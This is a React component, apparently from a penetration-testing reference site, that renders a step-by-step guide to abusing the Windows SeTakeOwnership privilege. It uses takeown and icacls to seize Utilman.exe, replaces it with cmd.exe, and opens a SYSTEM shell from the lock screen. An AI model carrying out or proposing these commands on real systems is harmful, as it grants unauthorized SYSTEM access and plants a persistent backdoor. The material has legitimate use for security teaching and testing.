import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const SeTakeOwnership = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              SeTakeOwnership privilege allows a user to take ownership of any
              object on the system, including files and registry keys.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Take ownership of Utilman.exe</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"takeown /f C:\\Windows\\System32\\Utilman.exe"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Grant yourself proper permissions over Utilman.exe
              <SyntaxHighlighter className="syntax" language="bash">
                {"icacls C:\\Windows\\System32\\Utilman.exe /grant {user}:F"}
              </SyntaxHighlighter>
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Replace Utilman.exe with cmd.exe
              <SyntaxHighlighter className="syntax" language="bash">
                {"copy cmd.exe utilman.exe"}
              </SyntaxHighlighter>
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>Lock the screen.</Typography>
            <Image
              src="/takeownership1.png"
              height={408}
              width={264}
              priority={true}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Click on "Ease of Access" button to launch cmd as System.
            </Typography>
            <Image
              src="/takeownership2.png"
              height={426}
              width={700}
              priority={true}
            />
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SeTakeOwnership;
